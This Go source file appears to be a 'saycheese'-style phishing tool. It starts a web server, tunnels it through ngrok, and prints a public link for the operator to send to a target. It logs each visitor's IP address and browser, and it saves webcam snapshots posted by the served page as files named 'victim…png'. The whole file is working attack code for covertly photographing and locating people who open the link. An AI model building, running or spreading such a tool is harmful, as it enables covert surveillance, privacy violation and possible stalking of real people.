package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

var (
	cono        int            = 0                                                   // this is for avoid problems
	detectNgrok *regexp.Regexp = regexp.MustCompile("https://+[a-z 0-9]+.ngrok.io") // this is the regex for get the url

	logo string = "" +
		"                                                              \033[36m     GGGGGGGG          \n" +
		"                                                                 GlGGGGGG1GGG        \n" +
		"                                                                GGG\033[37m@@@|G1\033[37m@@@\033[36m11GG     \n" +
		"                                                                l1\033[37m|:@@@G\033[37m@ @@\033[36m0GlG     \n" +
		"                                                                GG\033[37m| @@@G\033[37m@ @@\033[36m1G1      \n" +
		"                                                                 G\033[37mG@@@| \033[37m!@@\033[36mGGGG      \n" +
		"                                                                :GGGGGG!GlGGGGG      \n" +
		"                                                                :GGGGG11||GGGGG      \n" +
		"                                                                :GGGGG1\033[37m@@\033[36mGGGGGG   \n" +
		"                                                                .GGGGGGGGGGGGGG      \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                1GGGGGGGGGGGGGGG     \n" +
		"                                                               l|GGGGGGGGGGGGGG|!    \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                .GGGGGGGGGGGGGG      \n" +
		"                                                                .GGGGGGGGGGGGGG      \n" + "███████╗ █████╗ ██╗   ██╗    ██████╗ ██████╗ ██╗   ██╗██╗  ██╗" +
		"  .GGGGGGGGGGGGGG      \n" + "██╔════╝██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗██║   ██║██║  ██║" +
		"   GGGGGGGGGGGGGG      \n" + "███████╗███████║ ╚████╔╝     ██████╔╝██████╔╝██║   ██║███████║" +
		"   GGGGGGGGGGGGGG      \n" + "╚════██║██╔══██║  ╚██╔╝      ██╔══██╗██╔══██╗██║   ██║██╔══██║" +
		"   |GGGGGGGGGGGG       \n" + "███████║██║  ██║   ██║       ██████╔╝██║  ██║╚██████╔╝██║  ██║" +
		"     GGGGGGGGGGl        \n" + "╚══════╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝" +
		"   00:1G  GGG| 0|      \n"
)

func bodyRequest(r *http.Request) string {
	body, _ := ioutil.ReadAll(r.Body)
	r.Body = ioutil.NopCloser(bytes.NewBuffer(body))
	buf := new(bytes.Buffer)
	buf.ReadFrom(r.Body)
	newStr := buf.String()
	return newStr
}
func saycheese(w http.ResponseWriter, r *http.Request) {
	log.Println("\nNew photo")
	// decode the bodyrequest
	var conf map[string]string

	json.Unmarshal([]byte(bodyRequest(r)), &conf)

	// decode the base64
	imageData, err := base64.StdEncoding.DecodeString(conf["img"][31:])
	if err != nil {
		fmt.Println("fuck", err)
	}
	//  to bytes
	d := bytes.NewReader(imageData)
	// decode the image
	im, err := png.Decode(d)
	if err != nil {
		fmt.Println("fuck")
	}
	//create the archive

	archiveName := fmt.Sprintf("images/victim%d-%d-%d-%d-%s.png", time.Now().Second(), time.Now().Minute(), time.Now().Hour(), time.Now().Day(), time.Now().Month())

	fs, err := os.Create(archiveName)
	if err != nil {
		os.Mkdir("images", 0700)
		fs, _ = os.Create(archiveName)

	}
	//save the archive
	png.Encode(fs, im)
}
func writeIP(w http.ResponseWriter, r *http.Request) {
	// create or open the file
	fs, err := ioutil.ReadFile("logs.txt")
	if err != nil {

		_, err := os.Create("logs.txt")
		if err != nil {
			fmt.Println(err)
		}
	}
	//add more info to
	after := string(fs)
	//join the data
	output := strings.Join([]string{after, r.Header.Get("x-forwarded-for"), r.Header.Get("User-Agent")}, "\n")
	log.Printf("%s visit your page", r.Header.Get("x-forwarded-for"))
	err = ioutil.WriteFile("myfile", []byte(output), 0644)
	// send the pages
	http.ServeFile(w, r, "view"+r.URL.Path)
}
func sayNgrok() {
	// wait a second
	fmt.Println("wait a second")
	time.Sleep(time.Millisecond * 1700) // make the petition

	res, err := http.Get("http://127.0.0.1:4040/api/tunnels")
	if err != nil && cono < 10 {
		// this is shit
		fmt.Println("shit")
		sayNgrok()
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		// if this doesnt find the url you need to contact us
		fmt.Println("url dont find")
		return
	}
	// then send you  something like this  https://254ff7ccf60c.ngrok.io

	fmt.Printf("\nsend \033[36m%s\n\n\033[0m", detectNgrok.FindString(string(body)))
}

func main() {
	// clear the console
	if err := exec.Command("clear").Run(); err != nil {
		exec.Command("cli").Run()
	}
	// start the interface
	fmt.Printf("\033[35m%s\n\033[0m", logo)
	fmt.Println("\033[34mstarting  server \033[0m")

	go func() {
		// handlers request

		http.HandleFunc("/", writeIP)
		http.HandleFunc("/photo", saycheese)
		http.ListenAndServe(":8080", nil)

	}()
	go func() {
		// ejecuta el comando para ejecutar ngrok
		fmt.Println("I need ngrok!, if you don't have ngrok, try `sudo apt install ngrok`")
		if err := exec.Command("./ngrok", "http", "8080").Run(); err != nil {
			if err := exec.Command("ngrok", "http", "8080").Run(); err != nil {
				//fmt.Println("\033[31minstall ngrok for use this\033[0m")
			}
		}
	}()
	sayNgrok()
	for {
	}
}
